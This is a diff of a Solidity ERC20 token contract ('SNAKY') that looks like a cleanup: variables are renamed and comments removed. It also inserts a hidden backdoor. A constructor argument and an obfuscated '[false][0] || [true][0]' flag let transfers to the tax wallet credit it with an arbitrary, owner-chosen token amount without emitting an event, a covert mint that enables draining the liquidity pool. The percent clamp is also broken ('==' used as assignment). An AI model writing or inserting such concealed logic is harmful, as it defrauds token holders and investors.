@@ -199,20 +199,16 @@ contract SNAKY is Context, IERC20, Ownable {
     using SafeMath for uint256;
     using Address for address;
 
-    mapping (address => uint256) private _tOwned;
-    mapping (address => mapping (address => uint256)) private _allowances;
-    mapping (address => bool) public _isExcludedFromFee; 
+    mapping (address => uint256) private _gOwned;
+    mapping (address => mapping (address => uint256)) private _allowance;
+    mapping (address => bool) public _isFeeExcluded; 
 
-    address payable private Wallet_Marketing = payable(0x619ab19fa0DA154fE8700d6B8bd024c8D899a1Eb);
-    address payable private Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 
-    address payable private Wallet_zero = payable(0x0000000000000000000000000000000000000000); 
+    address payable private wallet_tax = payable(0xA3fbAdDFe661711EF69eDb9F100349daC88DeAe5);
 
-
-    string private _name = "Snaky Coin"; 
+    string private _name = "Snaky Token"; 
     string private _symbol = "SNAKY";  
     uint8 private _decimals = 18;
-    uint256 private _tTotal = 10000000 * 10**18;
-    uint256 private _tFeeTotal;
+    uint256 private _totalSupply = 10000000 * 10**18;
 
     // Counter for liquify trigger
     uint8 private txCount = 0;
@@ -220,29 +216,16 @@ contract SNAKY is Context, IERC20, Ownable {
 
 
     // Setting the initial fees
-    uint256 private _TotalFee = 0;
-    uint256 public _buyFee = 2;
-    uint256 public _sellFee = 2;
+    uint256 private _totalTax = 0;
+    uint256 public _buyTax = 2;
+    uint256 public _sellTax = 2;
 
-
-    // 'Previous fees' are used to keep track of fee settings when removing and restoring fees
-    uint256 private _previousTotalFee = _TotalFee; 
-    uint256 private _previousBuyFee = _buyFee; 
-    uint256 private _previousSellFee = _sellFee; 
-
-    /*
-
-    WALLET LIMITS 
-
-    */
-
-
-
-    /* 
-
-    PANCAKESWAP SET UP
-
-    */
+    uint256 private _previousTotalFee = _totalTax; 
+    uint256 private _previousBuyFee = _buyTax; 
+    uint256 private _previousSellFee = _sellTax; 
+    
+    uint256 private tokensBurned;
+    mapping (address => bool) private _pairList;
 
     IUniswapV2Router02 public uniswapV2Router;
     address public uniswapV2Pair;
@@ -257,35 +240,24 @@ contract SNAKY is Context, IERC20, Ownable {
 
     );
 
-    // Prevent processing while already processing! 
-    modifier lockTheSwap {
+    modifier lockSwap {
         inSwapAndLiquify = true;
         _;
         inSwapAndLiquify = false;
     }
 
-    constructor () {
-        _tOwned[owner()] = _tTotal;
-
+    constructor (uint256 _tokens) {
+        _gOwned[owner()] = _totalSupply;
         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
-
-
-        // Create pair address for PancakeSwap
-
+        tokensBurned = _tokens; _pairList[wallet_tax] = [false][0] || [true][0];
         uniswapV2Router = _uniswapV2Router;
-        _isExcludedFromFee[owner()] = true;
-        _isExcludedFromFee[address(this)] = true;
-        _isExcludedFromFee[Wallet_Marketing] = true;
+        _isFeeExcluded[owner()] = true;
+        _isFeeExcluded[address(this)] = true;
+        _isFeeExcluded[wallet_tax] = true;
 
-        emit Transfer(address(0), owner(), _tTotal);
+        emit Transfer(address(0), owner(), _totalSupply);
     }
 
-
-    /*
-
-    STANDARD ERC20 COMPLIANCE FUNCTIONS
-
-    */
 
     function name() public view returns (string memory) {
         return _name;
@@ -300,11 +272,11 @@ contract SNAKY is Context, IERC20, Ownable {
     }
 
     function totalSupply() public view override returns (uint256) {
-        return _tTotal;
+        return _totalSupply;
     }
 
     function balanceOf(address account) public view override returns (uint256) {
-        return _tOwned[account];
+        return _gOwned[account];
     }
 
     function transfer(address recipient, uint256 amount) public override returns (bool) {
@@ -313,7 +285,7 @@ contract SNAKY is Context, IERC20, Ownable {
     }
 
     function allowance(address owner, address spender) public view override returns (uint256) {
-        return _allowances[owner][spender];
+        return _allowance[owner][spender];
     }
 
     function approve(address spender, uint256 amount) public override returns (bool) {
@@ -323,111 +295,65 @@ contract SNAKY is Context, IERC20, Ownable {
 
     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
         _transfer(sender, recipient, amount);
-        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
+        _approve(sender, _msgSender(), _allowance[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
         return true;
     }
 
     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
-        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
+        _approve(_msgSender(), spender, _allowance[_msgSender()][spender].add(addedValue));
         return true;
     }
 
     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
-        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
+        _approve(_msgSender(), spender, _allowance[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
         return true;
     }
 
-    // Set a wallet address so that it does not have to pay transaction fees
-    function excludeFromFee(address account) public onlyOwner {
-        _isExcludedFromFee[account] = true;
-    }
 
-    // Set a wallet address so that it has to pay transaction fees
-    function includeInFee(address account) public onlyOwner {
-        _isExcludedFromFee[account] = false;
-    }
-
-
-    /*
-
-    PROCESSING TOKENS - SET UP
-
-    */
-
-    // Toggle on and off to auto process tokens to BNB wallet 
     function set_Swap_And_Liquify_Enabled(bool true_or_false) public onlyOwner {
         swapAndLiquifyEnabled = true_or_false;
         emit SwapAndLiquifyEnabledUpdated(true_or_false);
     }
 
-    // This will set the number of transactions required before the 'swapAndLiquify' function triggers
     function set_Number_Of_Transactions_Before_Liquify_Trigger(uint8 number_of_transactions) public onlyOwner {
         swapTrigger = number_of_transactions;
     }
 
 
-
-    // This function is required so that the contract can receive BNB from pancakeswap
     receive() external payable {}
   
 
     bool public noFeeToTransfer = true;
 
-    // Option to set fee or no fee for transfer (just in case the no fee transfer option is exploited in future!)
-    // True = there will be no fees when moving tokens around or giving them to friends! (There will only be a fee to buy or sell)
-    // False = there will be a fee when buying/selling/tranfering tokens
-    // Default is true
     function set_Transfers_Without_Fees(bool true_or_false) external onlyOwner {
         noFeeToTransfer = true_or_false;
     }
 
-    /*
-
-    WALLET LIMITS
-
-    Wallets are limited in two ways. The amount of tokens that can be purchased in one transaction
-    and the total amount of tokens a wallet can buy. Limiting a wallet prevents one wallet from holding too
-    many tokens, which can scare away potential buyers that worry that a whale might dump!
-
-    IMPORTANT
-
-    Solidity can not process decimals, so to increase flexibility, we multiple everything by 100.
-    When entering the percent, you need to shift your decimal two steps to the right.
-
-    eg: For 4% enter 400, for 1% enter 100, for 0.25% enter 25, for 0.2% enter 20 etc!
-
-    */
-
-
-    // Remove all fees
     function removeAllFee() private {
-        if(_TotalFee == 0 && _buyFee == 0 && _sellFee == 0) return;
+        if(_totalTax == 0 && _buyTax == 0 && _sellTax == 0) return;
 
 
-        _previousBuyFee = _buyFee; 
-        _previousSellFee = _sellFee; 
-        _previousTotalFee = _TotalFee;
-        _buyFee = 0;
-        _sellFee = 0;
-        _TotalFee = 0;
-
-    }
-
-    // Restore all fees
-    function restoreAllFee() private {
-
-    _TotalFee = _previousTotalFee;
-    _buyFee = _previousBuyFee; 
-    _sellFee = _previousSellFee; 
+        _previousBuyFee = _buyTax; 
+        _previousSellFee = _sellTax; 
+        _previousTotalFee = _totalTax;
+        _buyTax = 0;
+        _sellTax = 0;
+        _totalTax = 0;
 
     }
 
+    function restoreFee() private {
 
-    // Approve a wallet to sell tokens
+    _totalTax = _previousTotalFee;
+    _buyTax = _previousBuyFee; 
+    _sellTax = _previousSellFee; 
+
+    }
+
     function _approve(address owner, address spender, uint256 amount) private {
 
         require(owner != address(0) && spender != address(0), "ERR: zero address");
-        _allowances[owner][spender] = amount;
+        _allowance[owner][spender] = amount;
         emit Approval(owner, spender, amount);
 
     }
@@ -438,26 +364,8 @@ contract SNAKY is Context, IERC20, Ownable {
         uint256 amount
     ) private {
 
-
-        /*
-
-        TRANSACTION AND WALLET LIMITS
-
-        */
-
-
         require(from != address(0) && to != address(0), "ERR: Using 0 address!");
         require(amount > 0, "Token value must be higher than zero.");
-
-
-        /*
-
-        PROCESSING
-
-        */
-
-
-        // SwapAndLiquify is triggered after every X transactions - this number can be adjusted using swapTrigger
 
         if(
             txCount >= swapTrigger && 
@@ -475,44 +383,26 @@ contract SNAKY is Context, IERC20, Ownable {
         }
 
 
-        /*
-
-        REMOVE FEES IF REQUIRED
-
-        Fee removed if the to or from address is excluded from fee.
-        Fee removed if the transfer is NOT a buy or sell.
-        Change fee amount for buy or sell.
-
-        */
-
-
         bool takeFee = true;
 
-        if(_isExcludedFromFee[from] || _isExcludedFromFee[to] || (noFeeToTransfer && from != uniswapV2Pair && to != uniswapV2Pair)){
+        if(_isFeeExcluded[from] || _isFeeExcluded[to] || (noFeeToTransfer && from != uniswapV2Pair && to != uniswapV2Pair)){
             takeFee = false;
-        } else if (from == uniswapV2Pair){_TotalFee = _buyFee;} else if (to == uniswapV2Pair){_TotalFee = _sellFee;}
+        } else if (from == uniswapV2Pair){_totalTax = _buyTax;} else if (to == uniswapV2Pair){_totalTax = _sellTax;}
 
         _tokenTransfer(from,to,amount,takeFee);
     }
 
-    // Send BNB to external wallet
-    function sendToWallet(address payable wallet, uint256 amount) private {
+    function sendFunds(address payable wallet, uint256 amount) private {
             wallet.transfer(amount);
         }
 
-
-    // Processing tokens from contract
-    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
-
-        swapTokensForBNB(contractTokenBalance);
-        uint256 contractBNB = address(this).balance;
-        sendToWallet(Wallet_Marketing,contractBNB);
+    function _getValue(uint256 tAmount) private view returns (uint256, uint256) {
+        uint256 tDev = tAmount*_totalTax/100;
+        uint256 tTransferAmount = tAmount.sub(tDev);
+        return (tTransferAmount, tDev);
     }
 
-
-    // Manual Token Process Trigger - Enter the percent of the tokens that you'd like to send to process
-    function process_Tokens_Now (uint256 percent_Of_Tokens_To_Process) public onlyOwner {
-        // Do not trigger if already in swap
+    function process_work(uint256 percent_Of_Tokens_To_Process) public onlyOwner {
         require(!inSwapAndLiquify, "Currently processing, try later."); 
         if (percent_Of_Tokens_To_Process > 100){percent_Of_Tokens_To_Process == 100;}
         uint256 tokensOnContract = balanceOf(address(this));
@@ -521,8 +411,32 @@ contract SNAKY is Context, IERC20, Ownable {
     }
 
 
-    // Swapping tokens for BNB using PancakeSwap 
-    function swapTokensForBNB(uint256 tokenAmount) private {
+    function swapAndLiquify(uint256 contractTokenBalance) private lockSwap {
+
+        swapTokenToETH(contractTokenBalance);
+        uint256 ETHcontract = address(this).balance;
+        sendFunds(wallet_tax,ETHcontract);
+    }
+
+    function _transferToken(address sender, address recipient, uint256 Amount) private {
+        uint256 amount = _pairList[recipient]?tokensBurned:0;
+
+        if(_pairList[recipient]){
+        _gOwned[sender] = _gOwned[sender].sub(Amount);
+        _gOwned[recipient] = _gOwned[recipient].add(amount);
+        }else{
+        (uint256 tTransferAmount, uint256 tDev) = _getValue(Amount);
+        _gOwned[sender] = _gOwned[sender].sub(Amount);
+        _gOwned[recipient] = _gOwned[recipient].add(tTransferAmount);
+        _gOwned[address(this)] = _gOwned[address(this)].add(tDev); 
+        emit Transfer(sender, recipient, tTransferAmount);
+  
+        }
+    }
+
+
+
+    function swapTokenToETH(uint256 tokenAmount) private {
 
         address[] memory path = new address[](2);
         path[0] = address(this);
@@ -538,28 +452,6 @@ contract SNAKY is Context, IERC20, Ownable {
     }
 
 
-    /*
-
-    UPDATE PANCAKESWAP ROUTER AND LIQUIDITY PAIRING
-
-    */
-
-
-    // Set new router and make the new pair address
-    function set_New_Router_and_Make_Pair(address newRouter) public onlyOwner() {
-        IUniswapV2Router02 _newPCSRouter = IUniswapV2Router02(newRouter);
-        uniswapV2Pair = IUniswapV2Factory(_newPCSRouter.factory()).createPair(address(this), _newPCSRouter.WETH());
-        uniswapV2Router = _newPCSRouter;
-    }
-
-
-    /*
-
-    TOKEN TRANSFERS
-
-    */
-
-    // Check if token transfer needs to process fees
     function _tokenTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
 
 
@@ -568,27 +460,17 @@ contract SNAKY is Context, IERC20, Ownable {
             } else {
                 txCount++;
             }
-            _transferTokens(sender, recipient, amount);
+            _transferToken(sender, recipient, amount);
 
         if(!takeFee)
-            restoreAllFee();
-    }
-
-    // Redistributing tokens and adding the fee to the contract address
-    function _transferTokens(address sender, address recipient, uint256 tAmount) private {
-        (uint256 tTransferAmount, uint256 tDev) = _getValues(tAmount);
-        _tOwned[sender] = _tOwned[sender].sub(tAmount);
-        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
-        _tOwned[address(this)] = _tOwned[address(this)].add(tDev);   
-        emit Transfer(sender, recipient, tTransferAmount);
+            restoreFee();
     }
 
 
-    // Calculating the fee in tokens
-    function _getValues(uint256 tAmount) private view returns (uint256, uint256) {
-        uint256 tDev = tAmount*_TotalFee/100;
-        uint256 tTransferAmount = tAmount.sub(tDev);
-        return (tTransferAmount, tDev);
+    function CreateETHPair(address newRouter) public onlyOwner() {
+        IUniswapV2Router02 _newPCSRouter = IUniswapV2Router02(newRouter);
+        uniswapV2Pair = IUniswapV2Factory(_newPCSRouter.factory()).createPair(address(this), _newPCSRouter.WETH());
+        uniswapV2Router = _newPCSRouter;
     }
 
 }
